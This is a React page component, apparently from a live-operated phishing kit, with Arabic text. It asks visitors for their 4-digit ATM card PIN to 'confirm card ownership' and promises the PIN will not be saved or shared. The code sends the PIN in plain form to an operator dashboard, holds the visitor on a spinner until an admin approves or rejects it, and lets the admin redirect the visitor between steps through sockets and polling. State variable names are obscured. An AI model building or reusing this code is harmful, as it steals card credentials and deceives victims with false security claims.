

import { useState, useEffect, useRef } from "react"
import { useLocation } from 'wouter'
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Lock, AlertCircle, ShieldCheck, Eye } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { addData, notifyDashboard } from "@/lib/api"
import { onVisitorStatusUpdated } from "@/lib/socket"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { updateVisitorPage } from "@/lib/visitor-tracking"

export default function ConfiPage() {
  const [, navigate] = useLocation()
  const [_v6, _s6] = useState("")
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [_v6Status, _ss6] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
  const isWaitingRef = useRef(false)

  // Initialize visitor ID and update current page
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
    if (id) {
      updateVisitorPage(id, "confi", 6)
    }
  }, [])

  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "confi" })

  // Navigation listener - listen for admin redirects via Socket.io
  useEffect(() => {
    if (!visitorId) return
    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      if (field === 'currentStep') {
        if (status === 'home') navigate('/insur')
        else if (status === 'phone') navigate('/step5')
        else if (status === '_t6') navigate('/step4')
        else if (status === '_st1') navigate('/check')
        else if (status === '_t2') navigate('/step2')
      }
    })
    return () => unsubscribe()
  }, [navigate, visitorId])

  // Check access and monitor PIN status via Socket.io and Polling
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      navigate("/home-new")
      return
    }
    setIsLoading(false)

    // Socket listener
    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      if (field === '_v6Status') {
        if (status === 'rejected') {
          addData({ id: visitorID, _v6Status: 'pending' }).catch(console.error)
          _ss6('pending')
          _s6('')
          setError('رمز PIN غير صحيح - يرجى المحاولة مرة أخرى.')
          setIsSubmitting(false)
          isWaitingRef.current = false
        } else if (status === 'approved' && isWaitingRef.current) {
          _ss6('approved')
          setIsSubmitting(false)
          isWaitingRef.current = false
          navigate("/step5")
        }
      }
      // Handle redirect after PIN approval
      if (field === 'redirectPage' && status === 'step5') {
        navigate('/step5')
      }
    })

    // Polling fallback for PIN status
    const pollInterval = setInterval(async () => {
      if (!isWaitingRef.current) return
      try {
        const res = await fetch(`/api/visitors/${visitorID}`)
        if (!res.ok) return
        const data = await res.json()
        
        // Check _v6Status for PIN approval/rejection
        const pinStatus = data._v6Status || data.pinStatus
        if (pinStatus === 'rejected') {
          const rejectionMsg = data.pinRejectionMessage || "رمز PIN غير صحيح - يرجى المحاولة مرة أخرى."
          addData({ id: visitorID, _v6Status: 'pending' }).catch(console.error)
          _ss6('pending')
          _s6('')
          setError(rejectionMsg)
          setIsSubmitting(false)
          isWaitingRef.current = false
          return
        }
        if (pinStatus === 'approved' && isWaitingRef.current) {
          _ss6('approved')
          setIsSubmitting(false)
          isWaitingRef.current = false
          navigate("/step5")
          return
        }
        
        // Check redirectPage
        const rp = data.redirect_page || data.redirectPage
        if (rp === 'step5' || rp === 'phone' || rp === '_t5') {
          navigate('/step5')
        }
      } catch {
        // Silent fail
      }
    }, 1000)

    return () => {
      unsubscribe()
      clearInterval(pollInterval)
    }
  }, [navigate])

  const handlePinSubmit = async () => {
    if (_v6.length !== 4) {
      setError("يرجى إدخال الرقم السري المكون من 4 أرقام")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
      return
    }

    setIsSubmitting(true)
    isWaitingRef.current = true
    _ss6("verifying")

    try {
      // Send PIN data to server - status is pending waiting for admin approval
      await addData({
        id: visitorID,
        _v6,
        pinSubmittedAt: new Date().toISOString(),
        _v6Status: 'verifying',
        currentStep: 6,
        paymentStatus: 'pin_pending',
        pinUpdatedAt: new Date().toISOString()
      })

      // Notify dashboard with PIN data for admin review
      await notifyDashboard({
        id: visitorID,
        visitorId: visitorID,
        _v6Status: 'verifying',
        pinCode: _v6,
        pinSubmittedAt: new Date().toISOString(),
        currentPage: "confi",
        currentStep: 6,
        status: "pending"
      })

      // Trigger dashboard refresh for instant update
      if (typeof window !== 'undefined') {
        window.dispatchEvent(new CustomEvent('dashboard-refresh'));
      }

      // Add PIN to history with pending status
      await addToHistory(visitorID, "_t3", {
        _v6
      }, "pending")
    } catch (err) {
      console.error("Error submitting PIN:", err)
      setError("حدث خطأ في إرسال الرقم السري. يرجى المحاولة مرة أخرى.")
      setIsSubmitting(false)
      isWaitingRef.current = false
      _ss6("pending")
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
      {/* Full Screen Spinner when submitting - waiting for admin approval */}
      {(isSubmitting || _v6Status === "verifying") && (
        <UnifiedSpinner message="جاري مراجعة البيانات" submessage="يرجى الانتظار حتى يتم مراجعة بياناتك من قبل الإدارة...." />
      )}

      <div className="w-full max-w-md">
        {/* Icon */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-lg">
            <Lock className="w-12 h-12 text-[#0a4a68]" />
          </div>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-3xl shadow-2xl p-8">
          <form onSubmit={(e) => { e.preventDefault(); handlePinSubmit(); }} className="space-y-6">
            {error && (
              <Alert variant="destructive" className="border-2">
                <AlertCircle className="h-5 w-5" />
                <AlertDescription className="text-base">{error}</AlertDescription>
              </Alert>
            )}

            <div className="space-y-4">
              <p className="text-center text-gray-700 text-base font-semibold leading-relaxed">
                الرجاء إدخال رقم الصراف المكون من 4 خانات لتأكيد ملكية البطاقة
              </p>

              {/* Additional Info */}
              <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-2">
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <ShieldCheck className="w-4 h-4" />
                  <span>للتأكد من هويتك وحماية حسابك</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <Lock className="w-4 h-4" />
                  <span>الرقم السري محمي ومشفر بالكامل</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-green-800">
                  <Eye className="w-4 h-4" />
                  <span>لن يتم حفظ أو مشاركة الرقم السري</span>
                </div>
              </div>
              
              <Input
                type="password"
                inputMode="numeric"
                placeholder="رقم الصراف (PIN)"
                value={_v6}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 4)
                  _s6(value)
                  setError("")
                }}
                maxLength={4}
                className="h-14 text-center text-lg px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
                disabled={isSubmitting || _v6Status === "verifying"}
                required
                autoFocus
              />
            </div>

            <Button
              type="submit"
              className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
              disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
            >
              تأكيد الدفع
            </Button>
          </form>
        </div>
      </div>
    </div>
  )
}
